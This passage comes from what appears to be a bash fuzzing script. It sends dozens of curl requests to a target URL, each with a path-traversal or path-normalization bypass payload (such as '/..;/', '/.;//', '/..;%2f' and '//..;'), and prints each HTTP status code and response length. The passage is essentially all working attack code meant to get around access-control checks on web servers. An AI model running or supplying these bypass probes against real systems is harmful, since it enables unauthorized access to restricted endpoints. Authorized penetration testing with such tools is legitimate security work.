	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../.;/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/../.;/../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /..// ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/..//' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /..//../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..//../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/..//../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /..//../../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..//../../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/..//../../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /..//..;/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..//..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/..//..;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /../;/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/../;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /../;/../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../;/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/../;/../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /..;%2f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/..;%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /..;%2f..;%2f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;%2f..;%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/..;%%%%2f..;%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /..;%2f..;%2f..;%2f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;%2f..;%2f..;%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/..;%%%%2f..;%%%%2f..;%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /..;/../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/..;/../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /..;/..;/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;/..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/..;/..;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /..;// ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/..;//' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /..;//../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;//../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/..;//../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /..;//..;/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;//..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/..;//..;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /..;/;/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;/;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/..;/;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /..;/;/..;/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;/;/..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/..;/;/..;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /.// ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/.//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/.//' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /.;/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/.;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/.;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /.;// ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/.;//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/.;//' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ //.. ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}//.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}//..' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ //../../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}//../../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}//../../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ //..; ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}//..;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}//..;' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ //./ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}//./" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}//./' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ //.;/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}//.;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}//.;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ///.. ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}///.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}///..' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ///../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}///../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}///../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ///..// ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}///..//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}///..//' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ///..; ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}///..;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}///..;' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ///..;/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}///..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}///..;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ///..;// ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}///..;//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}///..;//' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ //;/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}//;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}//;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /;/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /;// ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/;//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/;//' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /;x ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/;x" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/;x' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /;x/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/;x/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/;x/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /x/../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/x/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/x/../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /x/..// ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/x/..//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/x/..//' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /x/../;/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/x/../;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/x/../;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /x/..;/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/x/..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/x/..;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /x/..;// ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/x/..;//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/x/..;//' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /x/..;/;/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/x/..;/;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/x/..;/;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /x//../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/x//../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/x//../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /x//..;/ ]:"
